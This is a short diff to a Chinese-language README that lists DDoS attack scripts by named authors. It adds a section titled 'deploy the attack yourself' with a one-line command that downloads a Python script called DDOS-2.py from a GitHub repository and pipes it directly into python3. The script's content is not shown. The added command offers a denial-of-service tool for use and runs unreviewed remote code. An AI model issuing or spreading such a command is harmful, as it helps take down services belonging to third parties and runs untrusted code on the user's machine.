@@ -23,5 +23,8 @@
 - DDOS攻擊第一版(By:Andysun06)
 - DDOS攻擊第二版(By:ChengChinHsia)
 
-
+## 親自部署攻擊
+```js
+wget -qO-  https://raw.githubusercontent.com/ChengChinHsia-Pig/pwd-gen/main/attacks/DDOS-2.py | python3 -
+```
 > Last Update:2022/09/11
